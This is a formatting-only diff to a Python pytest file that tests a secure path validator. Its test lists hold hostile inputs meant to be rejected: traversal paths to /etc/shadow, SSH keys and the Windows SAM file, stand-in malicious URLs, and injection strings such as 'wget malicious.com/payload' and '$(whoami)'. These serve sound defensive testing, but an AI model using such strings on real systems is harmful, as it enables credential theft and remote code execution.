@@ -33,8 +33,7 @@ class TestSecurePathValidator:
     def validator(self, temp_base_dir):
         """Create a validator instance for testing."""
         return SecurePathValidator(
-            allowed_base_dirs=[temp_base_dir],
-            allowed_extensions=['.json', '.txt']
+            allowed_base_dirs=[temp_base_dir], allowed_extensions=[".json", ".txt"]
         )
 
     def test_valid_file_path(self, validator, temp_base_dir):
@@ -62,7 +61,7 @@ class TestSecurePathValidator:
             "../../etc/shadow",
             "../../../root/.ssh/id_rsa",
             "test/../../../etc/passwd",
-            "..\\..\\windows\\system32\\config\\sam"  # Windows style
+            "..\\..\\windows\\system32\\config\\sam",  # Windows style
         ]
 
         for path in dangerous_paths:
@@ -75,7 +74,7 @@ class TestSecurePathValidator:
             "file:///etc/passwd",
             "http://example.com/malicious",
             "https://malicious.site/payload",
-            "ftp://evil.com/data"
+            "ftp://evil.com/data",
         ]
 
         for url in dangerous_urls:
@@ -90,7 +89,7 @@ class TestSecurePathValidator:
             "test.json & wget malicious.com/payload",
             "test.json `id`",
             "test.json $(whoami)",
-            "test.json ${PATH}"
+            "test.json ${PATH}",
         ]
 
         for pattern in dangerous_patterns:
@@ -123,8 +122,7 @@ class TestSecurePathValidator:
     def test_invalid_file_extension(self, validator):
         """Test rejection of invalid file extensions."""
         validator_with_extensions = SecurePathValidator(
-            allowed_base_dirs=["/tmp"],
-            allowed_extensions=['.json']
+            allowed_base_dirs=["/tmp"], allowed_extensions=[".json"]
         )
 
         with pytest.raises(PathValidationError, match="not allowed"):
@@ -157,7 +155,8 @@ class TestSecurePathValidator:
             test_file.write_text('{"test": "data"}')
 
             # Mock the data directory
-            with patch('src.security.path_validator.Path') as mock_path:
+            with patch("src.security.path_validator.Path") as mock_path:
+
                 def path_side_effect(path_str):
                     if path_str == "data":
                         return data_dir
@@ -181,7 +180,7 @@ class TestDataPathValidator:
             test_file = data_dir / "test.json"
             test_file.write_text('{"test": "data"}')
 
-            with patch('src.security.path_validator.Path') as mock_path:
+            with patch("src.security.path_validator.Path") as mock_path:
                 original_path = Path
 
                 def path_side_effect(path_str):
@@ -197,19 +196,19 @@ class TestDataPathValidator:
 
     def test_valid_json_file(self, temp_data_dir):
         """Test validation of valid JSON file in data directory."""
-        with patch('src.security.path_validator._data_validator', None):
+        with patch("src.security.path_validator._data_validator", None):
             result = validate_data_file_path("test.json")
             assert result.name == "test.json"
 
     def test_non_json_file_rejected(self, temp_data_dir):
         """Test rejection of non-JSON files."""
-        with patch('src.security.path_validator._data_validator', None):
+        with patch("src.security.path_validator._data_validator", None):
             with pytest.raises(PathValidationError, match="not allowed"):
                 validate_data_file_path("test.txt")
 
     def test_directory_traversal_in_data_validator(self, temp_data_dir):
         """Test that data validator rejects directory traversal."""
-        with patch('src.security.path_validator._data_validator', None):
+        with patch("src.security.path_validator._data_validator", None):
             with pytest.raises(PathValidationError, match="dangerous pattern"):
                 validate_data_file_path("../../../etc/passwd")
 
@@ -240,10 +239,7 @@ class TestSymbolicLinkProtection:
     def test_symlink_rejection(self, temp_dir_with_symlink):
         """Test that symbolic links are rejected."""
         base_dir, symlink_path = temp_dir_with_symlink
-        validator = SecurePathValidator(
-            allowed_base_dirs=[base_dir],
-            allowed_extensions=['.json']
-        )
+        validator = SecurePathValidator(allowed_base_dirs=[base_dir], allowed_extensions=[".json"])
 
         with pytest.raises(PathValidationError, match="Symbolic links are not allowed"):
             validator.validate_and_resolve_path("symlink.json")
@@ -263,8 +259,7 @@ class TestFileSizeLimits:
             normal_file.write_text('{"test": "data"}')
 
             validator = SecurePathValidator(
-                allowed_base_dirs=[str(base_dir)],
-                allowed_extensions=['.json']
+                allowed_base_dirs=[str(base_dir)], allowed_extensions=[".json"]
             )
 
             # This should pass without issues
@@ -280,8 +275,7 @@ class TestFileSizeLimits:
             base_dir.mkdir()
 
             validator = SecurePathValidator(
-                allowed_base_dirs=[str(base_dir)],
-                allowed_extensions=['.json']
+                allowed_base_dirs=[str(base_dir)], allowed_extensions=[".json"]
             )
 
             # Create a file that doesn't exist - should pass validation (for creation)
@@ -293,13 +287,10 @@ class TestFileSizeLimits:
 class TestSecurityLogging:
     """Test security event logging."""
 
-    @patch('src.security.path_validator.logger')
+    @patch("src.security.path_validator.logger")
     def test_security_events_logged(self, mock_logger):
         """Test that security violations are logged."""
-        validator = SecurePathValidator(
-            allowed_base_dirs=["/tmp"],
-            allowed_extensions=['.json']
-        )
+        validator = SecurePathValidator(allowed_base_dirs=["/tmp"], allowed_extensions=[".json"])
 
         with pytest.raises(PathValidationError):
             validator.validate_and_resolve_path("../etc/passwd")
